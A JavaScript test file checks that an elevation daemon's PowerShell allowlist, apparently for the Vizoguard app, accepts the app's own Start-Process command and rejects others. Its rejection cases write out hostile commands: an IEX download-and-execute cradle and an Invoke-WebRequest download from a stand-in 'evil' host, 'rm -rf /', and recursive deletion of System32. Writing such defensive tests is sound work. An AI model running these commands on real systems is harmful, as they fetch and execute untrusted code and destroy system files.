const assert = require("assert");
const { describe, it } = require("node:test");

// Test the PowerShell allowlist logic without spawning the daemon
const fs = require("fs");
const src = fs.readFileSync("src/elevation-daemon.js", "utf8");

// Extract the isAllowedPowerShell function body and eval it (safe — we wrote it)
function extractFunction(name, source) {
  const match = source.match(new RegExp("function " + name + "\\([^)]*\\)\\s*\\{[\\s\\S]*?\\n\\}"));
  if (!match) throw new Error(name + " not found");
  return match[0];
}

const fnSrc = extractFunction("isAllowedPowerShell", src);
eval(fnSrc); // defines isAllowedPowerShell globally

describe("Elevation daemon PowerShell restriction", () => {
  it("allows Start-Process commands used by the app", () => {
    const cmd = 'powershell -Command "$p = Start-Process -FilePath \'C:\\\\Program Files\\\\Vizoguard\\\\bin\\\\sing-box.exe\' -PassThru -WindowStyle Hidden; $p.Id | Out-File -FilePath \'C:\\\\tmp\\pid\' -Encoding ascii"';
    assert.strictEqual(isAllowedPowerShell(cmd), true, "Valid Start-Process should be allowed");
  });

  it("rejects Invoke-Expression", () => {
    const cmd = 'powershell -Command "Invoke-Expression \'rm -rf /\'"';
    assert.strictEqual(isAllowedPowerShell(cmd), false, "Invoke-Expression must be blocked");
  });

  it("rejects IEX alias", () => {
    const cmd = 'powershell -Command "IEX (New-Object Net.WebClient).downloadString(\'http://evil\')"';
    assert.strictEqual(isAllowedPowerShell(cmd), false, "IEX must be blocked");
  });

  it("rejects Invoke-WebRequest", () => {
    const cmd = 'powershell -Command "Invoke-WebRequest -Uri http://evil -OutFile C:\\\\tmp\\bad.exe"';
    assert.strictEqual(isAllowedPowerShell(cmd), false, "Invoke-WebRequest must be blocked");
  });

  it("rejects Remove-Item", () => {
    const cmd = 'powershell -Command "Remove-Item -Path C:\\\\Windows\\\\System32 -Recurse"';
    assert.strictEqual(isAllowedPowerShell(cmd), false, "Remove-Item must be blocked");
  });

  it("rejects commands without Start-Process", () => {
    const cmd = 'powershell -Command "Write-Host hello"';
    assert.strictEqual(isAllowedPowerShell(cmd), false, "Non-Start-Process must be blocked");
  });

  it("rejects non-powershell commands", () => {
    assert.strictEqual(isAllowedPowerShell("route add 0.0.0.0 mask 0.0.0.0 10.0.0.1"), false, "Non-powershell must be blocked");
  });
});
